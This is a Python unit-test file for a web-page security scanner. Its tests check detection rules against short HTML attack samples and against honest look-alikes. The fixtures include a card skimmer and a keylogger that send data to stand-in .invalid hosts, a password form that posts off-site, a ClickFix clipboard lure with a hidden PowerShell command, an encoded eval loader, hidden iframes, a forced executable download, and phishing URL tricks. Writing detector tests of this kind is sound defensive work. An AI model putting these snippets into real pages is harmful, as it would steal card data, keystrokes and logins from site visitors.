"""Each rule should fire on its attack and stay quiet on the honest look-alike."""

import unittest

from preflight.detectors import run_detectors
from preflight.parsing import parse_html
from tests.helpers import context_for, detector_ids


def ids_for(html: str, url: str = "https://example-site.com/") -> set[str]:
    findings, errors = run_detectors(context_for(html, url))
    assert not errors, errors
    return detector_ids(findings)


class FormRuleTests(unittest.TestCase):
    def test_password_posted_to_other_site(self):
        html = "<form action='https://collector.invalid/p'><input type=password></form>"
        self.assertIn("form.password_cross_site", ids_for(html))

    def test_same_site_login_is_quiet(self):
        html = "<form action='/login'><input type=password></form>"
        self.assertNotIn("form.password_cross_site", ids_for(html))

    def test_known_identity_provider_is_allowed(self):
        html = "<form action='https://login.microsoftonline.com/x'><input type=password></form>"
        self.assertNotIn("form.password_cross_site", ids_for(html))

    def test_brand_login_on_wrong_site(self):
        html = "<title>Sign in - PayPal</title><form><input type=password></form>"
        self.assertIn("form.brand_mismatch", ids_for(html, "https://pay-secure.top/"))
        self.assertNotIn("form.brand_mismatch", ids_for(html, "https://www.paypal.com/signin"))

    def test_card_skimmer(self):
        html = ("<form action='/pay'><input name=cardnumber autocomplete=cc-number></form><script>"
                "document.querySelector('input').addEventListener('change',function(e){"
                "new Image().src='https://x.invalid/c?d='+e.target.value})</script>")
        self.assertIn("form.card_skimmer", ids_for(html))


class ScriptRuleTests(unittest.TestCase):
    def test_clickfix(self):
        html = ("<h2>Verify you are human</h2><p>Press Windows + R then Ctrl + V</p>"
                "<script>navigator.clipboard.writeText('powershell -w hidden -c test')</script>")
        self.assertIn("js.clipboard_command", ids_for(html))

    def test_install_docs_copy_button_is_not_clickfix(self):
        html = ("<pre>curl -sSL https://get.tool.example/i.sh | sh</pre>"
                "<button onclick=\"navigator.clipboard.writeText('curl -sSL https://get.tool.example/i.sh | sh')\">"
                "Copy</button>")
        found = ids_for(html)
        self.assertNotIn("js.clipboard_command", found)
        self.assertIn("js.clipboard_visible_command", found)

    def test_article_about_clickfix_is_only_medium(self):
        html = "<blockquote>Press Windows + R and paste the code to verify you are human</blockquote>"
        findings, _ = run_detectors(context_for(html))
        severities = {f.detector_id: f.severity.name for f in findings}
        self.assertEqual(severities.get("text.paste_and_run"), "MEDIUM")

    def test_search_autocomplete_is_not_a_keylogger(self):
        html = ("<input id=q><script>q.addEventListener('input',e=>"
                "fetch('/api/suggest?q='+e.target.value))</script>")
        self.assertNotIn("js.keylogger", ids_for(html))

    def test_keylogger_sending_off_site(self):
        html = ("<input id=q><script>document.addEventListener('keydown',function(e){"
                "navigator.sendBeacon('https://logger.invalid/k',e.key)})</script>")
        self.assertIn("js.keylogger", ids_for(html))

    def test_packed_loader(self):
        html = "<script>eval(atob('Y29uc29sZS5sb2coMSk='))</script>"
        self.assertIn("js.decode_and_run", ids_for(html))

    def test_cryptominer(self):
        html = ("<script>var miner=new DemoMiner('k');miner.start();"
                "new Worker('a.js');new Worker('b.js')</script>")
        self.assertIn("js.cryptominer", ids_for(html))


class ContentRuleTests(unittest.TestCase):
    def test_hidden_cross_site_iframe(self):
        html = "<iframe src='https://exploit.invalid/x' width=0 height=0></iframe>"
        self.assertIn("html.hidden_iframe", ids_for(html))

    def test_tag_manager_noscript_frame_is_ignored(self):
        html = ("<noscript><iframe src='https://www.googletagmanager.com/ns.html' height='0' "
                "width='0' style='display:none'></iframe></noscript>")
        self.assertNotIn("html.hidden_iframe", ids_for(html))

    def test_auto_download(self):
        html = "<meta http-equiv='refresh' content='0;url=https://drop.invalid/update.exe'>"
        self.assertIn("html.auto_download", ids_for(html))

    def test_browser_in_the_browser(self):
        html = ("<div style='position:fixed;z-index:9999'><span>https://login.paypal.com/auth</span>"
                "<iframe src='https://evil.invalid/f'></iframe></div>")
        self.assertIn("html.browser_in_browser", ids_for(html, "https://rewards-claim.top/"))


class UrlRuleTests(unittest.TestCase):
    def test_userinfo_trick(self):
        self.assertIn("url.userinfo_at", ids_for("", "https://paypal.com@evil.invalid/"))

    def test_lookalike(self):
        self.assertIn("url.lookalike", ids_for("", "https://paypa1.com/login"))

    def test_ip_host(self):
        self.assertIn("url.ip_host", ids_for("", "http://203.0.113.7/login"))


class ParserRobustnessTests(unittest.TestCase):
    def test_malformed_html_does_not_crash(self):
        doc = parse_html("<form action=><input type=password<script>eval(<iframe src=", "https://a.com/")
        self.assertIsNotNone(doc)

    def test_extracts_forms_scripts_and_iframes(self):
        doc = parse_html("<form action='/x'><input type=password name=p></form>"
                         "<script src='/a.js'></script><script>var x=1</script>"
                         "<iframe src='https://b.com/' hidden></iframe>", "https://a.com/")
        self.assertEqual(doc.forms[0].action, "https://a.com/x")
        self.assertTrue(doc.forms[0].has_password)
        self.assertEqual(doc.external_script_urls, ["https://a.com/a.js"])
        self.assertTrue(doc.iframes[0].hidden)


if __name__ == "__main__":
    unittest.main()
